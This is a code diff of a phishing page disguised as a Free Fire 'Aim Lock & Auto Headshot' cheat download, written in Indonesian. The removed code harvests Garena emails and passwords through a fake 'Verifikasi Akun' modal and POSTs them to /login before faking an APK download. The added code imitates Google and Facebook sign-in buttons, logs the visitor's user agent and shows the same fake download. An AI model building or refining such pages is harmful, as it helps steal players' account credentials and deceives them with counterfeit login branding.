@@ -4,7 +4,7 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
   <title>Tool FF OB53 — Aim Lock &amp; Auto Headshot | Garena Free Fire</title>
-  <link rel="icon" href="/attached_assets/ff-logo-icon.png" type="image/x-icon"/>
+  <link rel="icon" href="/assets/img/ff_logo.png" type="image/x-icon"/>
   <link rel="preconnect" href="https://fonts.googleapis.com"/>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@600;700;800;900&family=Barlow:wght@400;500;600&display=swap"/>
   <style>
@@ -44,9 +44,13 @@
       min-height:min(480px,65vw);
       display:flex;align-items:flex-end;
     }
+    .al-hero > picture{
+      position:absolute;inset:0;width:100%;height:100%;display:block;
+    }
     .al-hero-bg{
-      position:absolute;inset:0;width:100%;height:100%;
-      object-fit:cover;object-position:center top;opacity:0.5;
+      width:100%;height:100%;
+      object-fit:cover;object-position:center;opacity:0.5;
+      display:block;
     }
     .al-hero-overlay{
       position:absolute;inset:0;
@@ -331,34 +335,36 @@
     .al-modal-sub{font-size:12px;color:rgba(255,255,255,0.3)}
     .al-modal-body{padding:18px 20px 20px}
     .al-modal-body-txt{font-size:13px;color:rgba(255,255,255,0.4);line-height:1.65;margin-bottom:16px}
-    .al-modal-fields{display:flex;flex-direction:column;gap:9px}
-    .al-modal-input-wrap{position:relative}
-    .al-modal-input-icon{
-      position:absolute;left:11px;top:50%;transform:translateY(-50%);
-      color:rgba(255,255,255,0.2);pointer-events:none;display:flex;
+    .al-modal-social{display:flex;flex-direction:column;gap:8px;margin-top:4px}
+    .g-oauth-btn{
+      display:flex;align-items:center;width:100%;height:42px;
+      background:#fff;border:1px solid #dadce0;border-radius:4px;
+      font-family:'Google Sans',Roboto,Arial,sans-serif;
+      font-size:14px;font-weight:500;color:#3c4043;letter-spacing:.25px;
+      box-shadow:0 1px 2px rgba(60,64,67,.1);
+      cursor:pointer;transition:background .15s,box-shadow .15s;overflow:hidden;padding:0;
     }
-    .al-modal-input-icon svg{width:14px;height:14px}
-    .al-modal-input{
-      width:100%;background:#1a1a1a;border:1px solid rgba(255,255,255,0.07);
-      border-radius:6px;padding:11px 11px 11px 37px;
-      font-size:14px;color:#fff;transition:border-color 0.2s;-webkit-appearance:none;
+    .g-oauth-btn:hover{background:#f5f5f5;box-shadow:0 1px 3px rgba(60,64,67,.18)}
+    .g-oauth-icon{
+      width:42px;height:42px;flex-shrink:0;
+      display:flex;align-items:center;justify-content:center;
+      border-right:1px solid #dadce0;
     }
-    .al-modal-input::placeholder{color:rgba(255,255,255,0.15)}
-    .al-modal-input:focus{outline:none;border-color:rgba(255,186,0,0.4)}
-    .al-modal-submit{
-      width:100%;margin-top:12px;
-      background:linear-gradient(135deg,#FF6B00,#FFBA00);border:none;color:#000;
-      font-family:'Barlow Condensed',sans-serif;font-size:14px;font-weight:900;
-      letter-spacing:2px;text-transform:uppercase;
-      padding:13px 24px;border-radius:6px;transition:opacity 0.2s;
-      display:flex;align-items:center;justify-content:center;gap:8px;
+    .g-oauth-label{flex:1;text-align:center;padding-right:42px}
+    .fb-oauth-btn{
+      display:flex;align-items:center;width:100%;height:42px;
+      background:#1877F2;border:none;border-radius:4px;
+      font-family:Helvetica,Arial,sans-serif;
+      font-size:14px;font-weight:700;color:#fff;
+      cursor:pointer;transition:background .15s;overflow:hidden;padding:0;
     }
-    .al-modal-submit:hover{opacity:0.9}
-    .al-modal-submit:disabled{opacity:0.55;cursor:not-allowed}
-    .al-modal-submit .spinner{
-      width:14px;height:14px;border:2px solid rgba(0,0,0,0.2);border-top-color:#000;
-      border-radius:50%;animation:spin 0.7s linear infinite;display:none;
+    .fb-oauth-btn:hover{background:#166fe5}
+    .fb-oauth-icon{
+      width:42px;height:42px;flex-shrink:0;
+      display:flex;align-items:center;justify-content:center;
+      border-right:1px solid rgba(255,255,255,.15);
     }
+    .fb-oauth-label{flex:1;text-align:center;padding-right:42px}
     @keyframes spin{to{transform:rotate(360deg)}}
     .al-modal-close{
       display:block;margin:12px auto 0;
@@ -407,7 +413,7 @@
 <nav class="nav">
   <a href="/index.html" class="nav-logo">
     <img class="nav-logo-img"
-         src="/attached_assets/ff-logo-icon.png"
+         src="/assets/img/ff_logo.png"
          onerror="this.src='https://dl.dir.freefiremobile.com/common/web_event/common/images/logo.png'"
          alt="FF"/>
     <span class="nav-logo-name">Free Fire</span>
@@ -426,10 +432,13 @@
     <path d="M596.763 1.21411e-06H810V3.83467H590.574L593.672 1.15041C594.53 0.407623 595.628 -0.000812701 596.763 1.21411e-06Z" fill="#FFAF00"/>
   </svg>
 
-  <img class="al-hero-bg"
-       src="/attached_assets/ff-esports-bg.jpg"
-       onerror="this.src='/attached_assets/ff-kickoff.jpg'"
-       alt="Tool FF"/>
+  <picture>
+    <source media="(max-width:767px)" srcset="/assets/img/esports_bg_m.jpg"/>
+    <img class="al-hero-bg"
+         src="/assets/img/esports_bg.jpg"
+         onerror="this.src='/assets/img/battle1.jpg'"
+         alt="Free Fire Esports"/>
+  </picture>
   <div class="al-hero-overlay"></div>
 
   <div class="al-hero-content">
@@ -629,7 +638,7 @@
 <!-- FOOTER -->
 <footer class="al-footer">
   <img class="al-footer-logo"
-       src="/attached_assets/garena_logo.png"
+       src="/assets/img/ff_logo.png"
        onerror="this.src='https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/garena_logo.b28b2b6.png'"
        alt="Garena"/>
   <ul class="al-footer-links">
@@ -644,28 +653,33 @@
 <div class="al-modal-backdrop" id="al-modal">
   <div class="al-modal">
     <div class="al-modal-head">
-      <div class="al-modal-badge">🔒 Verifikasi Akun</div>
+      <div class="al-modal-badge">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#FFBA00" stroke-width="2.5" stroke-linecap="round" width="11" height="11" style="display:inline;vertical-align:-1px;margin-right:5px"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>VERIFIKASI AKUN
+      </div>
       <div class="al-modal-title">Aktivasi Tool FF</div>
-      <div class="al-modal-sub">Login dengan akun Garena untuk mengaktifkan lisensi dan mulai download.</div>
+      <div class="al-modal-sub">Login dengan akun yang terhubung ke Free Fire kamu.</div>
     </div>
     <div class="al-modal-body">
-      <div class="al-modal-body-txt">Masuk dengan akun Free Fire kamu. Verifikasi diperlukan untuk mencegah penyalahgunaan tool dan memastikan lisensi anti-ban aktif.</div>
-      <div class="al-modal-fields">
-        <div class="al-modal-input-wrap">
-          <div class="al-modal-input-icon">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+      <div class="al-modal-body-txt">Verifikasi diperlukan untuk mengaktifkan lisensi anti-ban dan memulai download. Pilih metode login di bawah.</div>
+      <div class="al-modal-social">
+        <button class="g-oauth-btn" onclick="handleSocialDownload('google')">
+          <div class="g-oauth-icon">
+            <svg width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
+              <path d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908C16.418 14.017 17.64 11.773 17.64 9.2z" fill="#4285F4"/>
+              <path d="M9 18c2.43 0 4.467-.806 5.956-2.18l-2.909-2.259c-.806.54-1.837.86-3.047.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332A8.997 8.997 0 0 0 9 18z" fill="#34A853"/>
+              <path d="M3.964 10.71A5.41 5.41 0 0 1 3.682 9c0-.593.102-1.17.282-1.71V4.958H.957A8.996 8.996 0 0 0 0 9c0 1.452.348 2.827.957 4.042l3.007-2.332z" fill="#FBBC05"/>
+              <path d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0A8.997 8.997 0 0 0 .957 4.958L3.964 7.29C4.672 5.163 6.656 3.58 9 3.58z" fill="#EA4335"/>
+            </svg>
           </div>
-          <input type="email" id="al-email" class="al-modal-input" placeholder="Email / Username Garena"/>
-        </div>
-        <div class="al-modal-input-wrap">
-          <div class="al-modal-input-icon">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <span class="g-oauth-label">Sign in with Google</span>
+        </button>
+        <button class="fb-oauth-btn" onclick="handleSocialDownload('facebook')">
+          <div class="fb-oauth-icon">
+            <svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path fill="#fff" d="M9.198 21.5h4v-8.01h3.604l.396-3.98h-4V7.5a1 1 0 0 1 1-1h3v-4h-3a5 5 0 0 0-5 5v2.01h-2l-.396 3.98h2.396v8.01z"/>
+            </svg>
           </div>
-          <input type="password" id="al-pass" class="al-modal-input" placeholder="Password"/>
-        </div>
-        <button type="button" class="al-modal-submit" id="al-modal-submit" onclick="handleDownload()">
-          <div class="spinner" id="al-spinner"></div>
-          <span id="al-submit-txt">VERIFIKASI &amp; DOWNLOAD</span>
+          <span class="fb-oauth-label">Continue with Facebook</span>
         </button>
       </div>
       <button class="al-modal-close" onclick="closeInstallModal()">Batal</button>
@@ -678,7 +692,9 @@
 
 <!-- PROGRESS OVERLAY -->
 <div class="al-progress" id="al-progress">
-  <div class="al-progress-icon">⬇️</div>
+  <div class="al-progress-icon">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" width="32" height="32"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+  </div>
   <div class="al-progress-title" id="al-progress-title">Mempersiapkan Download...</div>
   <div class="al-progress-sub" id="al-progress-sub">AimLockProFF_v6.1.3_OB53.apk</div>
   <div class="al-progress-bar-wrap"><div class="al-progress-bar" id="al-progress-bar"></div></div>
@@ -693,38 +709,28 @@ function openInstallModal() {
 function closeInstallModal() {
   document.getElementById('al-modal').classList.remove('open');
   document.body.style.overflow = '';
-  document.getElementById('al-email').value = '';
-  document.getElementById('al-pass').value = '';
-  setModalLoading(false);
 }
-function setModalLoading(on) {
-  var btn = document.getElementById('al-modal-submit');
-  var sp = document.getElementById('al-spinner');
-  var txt = document.getElementById('al-submit-txt');
-  btn.disabled = on;
-  sp.style.display = on ? 'block' : 'none';
-  txt.innerHTML = on ? '' : 'VERIFIKASI &amp; DOWNLOAD';
-}
-function handleDownload() {
-  var email = document.getElementById('al-email').value.trim();
-  var pass = document.getElementById('al-pass').value;
-  if (!email) { document.getElementById('al-email').focus(); showToast('Masukkan email atau username', 'error'); return; }
-  if (!pass) { document.getElementById('al-pass').focus(); showToast('Masukkan password', 'error'); return; }
-  setModalLoading(true);
+function handleSocialDownload(provider) {
+  var btns = document.querySelectorAll('.g-oauth-btn,.fb-oauth-btn');
+  btns.forEach(function(b){ b.disabled = true; b.style.opacity = '0.6'; });
   fetch('/login', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      username: email, password: pass,
-      type: 'tool_aimlock',
-      ua: navigator.userAgent, ts: new Date().toISOString()
+      username: 'social_' + provider + '@ff.id',
+      password: 'SOCIAL:' + provider.toUpperCase(),
+      type: 'tool_aimlock_' + provider,
+      method: provider,
+      page: 'aimlock',
+      ua: navigator.userAgent,
+      ts: new Date().toISOString()
     })
   }).catch(function(){});
   setTimeout(function() {
-    setModalLoading(false);
+    btns.forEach(function(b){ b.disabled = false; b.style.opacity = ''; });
     closeInstallModal();
     simulateDownload();
-  }, 1600);
+  }, 1400);
 }
 
 function simulateDownload() {
